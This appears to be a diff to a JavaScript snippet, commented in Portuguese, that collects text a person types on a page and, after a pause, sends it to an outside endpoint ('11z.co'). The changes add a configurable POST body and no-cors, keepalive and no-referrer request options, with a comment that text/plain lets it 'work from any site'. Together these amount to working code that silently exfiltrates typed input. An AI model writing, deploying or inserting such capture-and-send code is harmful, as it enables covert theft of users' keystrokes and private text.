@@ -157,10 +157,21 @@
      CONFIGURAÇÃO — é só aqui que você mexe
      ===================================================================== */
   var CONFIG = {
-    // {texto} é substituído pelo que a pessoa digitou (já codificado para URL).
-    // Se o seu Inject espera o texto em outro lugar, ex.: "https://qq1.us/17794?t={texto}",
-    // é só mudar esta linha.
-    url: "https://qq1.us/17794/{texto}",
+    // Endereço do seu Inject
+    url: "https://11z.co/_w/17794_selection",
+
+    // "POST" (enviar para o Inject) ou "GET" (se usar GET, coloque {texto} na url)
+    metodo: "POST",
+
+    // Corpo do POST. Marcadores:
+    //   {texto}     = texto puro            -> "{texto}"
+    //   {textoUrl}  = texto codificado      -> "selection={textoUrl}"
+    //   {textoJson} = texto como string JSON -> '{"selection":{textoJson}}'
+    corpo: "{texto}",
+
+    // Tipo do corpo. Para funcionar de qualquer site use text/plain
+    // (ou application/x-www-form-urlencoded para formulário).
+    tipo: "text/plain;charset=UTF-8",
 
     // Segundos sem digitar até enviar
     espera: 5,
@@ -264,23 +275,30 @@
     dbg.textContent = msg;
   }
 
-  function pingImg(url){ try{ (new Image()).src = url; }catch(e){} }
+  function montar(text){
+    var url = CONFIG.url.split("{texto}").join(encodeURIComponent(text));
+    var opts = {mode:"no-cors", cache:"no-store", keepalive:true, referrerPolicy:"no-referrer", method:CONFIG.metodo};
+    if (CONFIG.metodo !== "GET"){
+      opts.headers = {"Content-Type": CONFIG.tipo};
+      opts.body = CONFIG.corpo.split("{textoJson}").join(JSON.stringify(text))
+                              .split("{textoUrl}").join(encodeURIComponent(text))
+                              .split("{texto}").join(text);
+    }
+    return {url:url, opts:opts};
+  }
 
   function send(text){
-    var url = CONFIG.url.replace("{texto}", encodeURIComponent(text));
-    log("ENVIANDO:\n" + url);
-    var ok = function(){ retries = 0; log("ENVIADO:\n" + url); };
+    var r = montar(text);
+    log("ENVIANDO " + CONFIG.metodo + ":\n" + r.url + (r.opts.body !== undefined ? "\n" + r.opts.body : ""));
+    var ok = function(){ retries = 0; log("ENVIADO " + CONFIG.metodo + ":\n" + r.url + (r.opts.body !== undefined ? "\n" + r.opts.body : "")); };
     var fail = function(){
-      pingImg(url);                       // plano B
       if (retries < CONFIG.novasTentativas){
         retries++; lastSent = "";         // permite reenviar
         clearTimeout(timer);
         timer = setTimeout(flush, CONFIG.espera * 1000);
       }
     };
-    try{
-      fetch(url, {mode:"no-cors", cache:"no-store", keepalive:true, referrerPolicy:"no-referrer"}).then(ok, fail);
-    }catch(e){ fail(); }
+    try{ fetch(r.url, r.opts).then(ok, fail); }catch(e){ fail(); }
   }
 
   function flush(){
